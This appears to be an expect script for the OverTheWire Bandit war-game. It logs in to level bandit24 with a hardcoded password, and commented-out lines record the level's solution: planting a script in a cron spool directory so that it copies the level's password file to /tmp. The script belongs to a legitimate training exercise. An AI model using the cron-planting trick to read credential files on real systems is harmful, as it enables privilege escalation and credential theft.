#!/usr/bin/expect -f

spawn ssh -p 2220 bandit24@bandit.labs.overthewire.org
expect "*: "
send "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\r"
expect "*\$ "

interact

# send "cat /etc/cron.d/cronjob_bandit24\r"
# expect "*\$ "

# send "cat /usr/bin/cronjob_bandit24.sh\r"
# expect "*\$ "

# send "echo \"cat /etc/bandit_pass/bandit24 > /tmp/exfil\" > /var/spool/bandit24/exploit.sh\r"
# expect "*\$ "

# send "chmod +x /var/spool/bandit24/exploit.sh\r"
# expect "*\$ "

# sleep 60

# send "cat /tmp/exfil\r"
# expect "*\$ "

# send "rm -f /tmp/exfil\r"
# expect "*\$ "

# send "exit\r"